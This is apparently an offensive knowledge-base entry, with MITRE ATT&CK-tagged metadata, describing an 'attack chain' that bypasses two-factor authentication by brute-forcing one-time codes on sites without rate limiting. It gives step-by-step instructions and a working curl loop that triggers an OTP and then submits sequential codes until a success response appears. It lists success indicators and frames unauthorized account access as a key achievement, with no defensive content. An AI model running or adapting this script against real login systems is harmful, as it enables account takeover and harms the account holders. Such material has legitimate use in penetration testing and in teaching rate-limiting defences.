---
id: ac-2fa-brute-bypass-001
name: Bypass Two-Factor Authentication via OTP Brute-Force Attacks
tags:
  - 2fa
  - brute-force
  - authentication-bypass
  - otp
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Brute-Force-2FA-OTP-to-Bypass-Authentication]]'
step_count: 1
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:31:42.615Z'
description: >-
  An attack chain exploiting the absence of rate limiting on 2FA OTP attempts to
  brute-force codes and gain unauthorized account access.
skill_level: intermediate
impact_level: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Bypass Two-Factor Authentication via OTP Brute-Force Attacks

Multi-stage attack chain demonstrating a complete attack workflow targeting web applications with weak 2FA protections.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Low |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access Attempt] --> B[Brute-Force OTP]
    B --> C[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual or scripted HTTP requests)

### Target Environment

- Web platform with 2FA OTP login
- No rate limiting on OTP attempts
- Network access to login endpoint

### Initial Access Requirements

- Valid username or email for target account
- Knowledge of the 2FA setup (e.g., TOTP or email-based OTP)
- No prior session required, but valid initial login to trigger OTP

## Detailed Attack Procedures

### Step 1: Brute-Force OTP Attempts
procedure: [[procedures/Brute-Force-2FA-OTP-to-Bypass-Authentication]]

**Objective**: Exploit lack of rate limiting to guess the 6-digit OTP code and complete authentication.

**Instructions**: Initiate a login with the target credentials to receive an OTP (via email or app). Then, use repeated HTTP requests to submit varying OTP values until success. For automation, script with curl or use a tool like Burp Intruder. Example using [[commands/curl-2fa-brute]] to test sequential codes:

```bash
# First, trigger OTP (manual or via initial curl)
curl -X POST https://target.com/login -d "username=target@example.com&password=knownpass" -c cookies.txt

# Then brute-force (loop from 000000 to 999999, but truncated for example)
for code in {000000..000010}; do
  curl -X POST https://target.com/verify-otp -b cookies.txt -d "otp=$code" -o response_$code.html
  if grep -q "success" response_$code.html; then
    echo "OTP found: $code"
    break
  fi
done
```

Adjust the endpoint and parameters based on the target's login flow. Monitor responses for success indicators like session tokens or redirects to dashboard.

**Expected Output**: Successful response containing access token or dashboard redirect upon correct OTP match.

**Success Indicators**:
- HTTP 200 or 302 redirect to authenticated area
- Presence of session cookie or auth token in response
- No lockout or error after multiple failures

## Attack Chain Summary

### Key Achievements

1. Bypassed 2FA protection without legitimate OTP
2. Gained unauthorized access to target account
3. Demonstrated feasibility of brute-force due to no restrictions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Brute Force]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
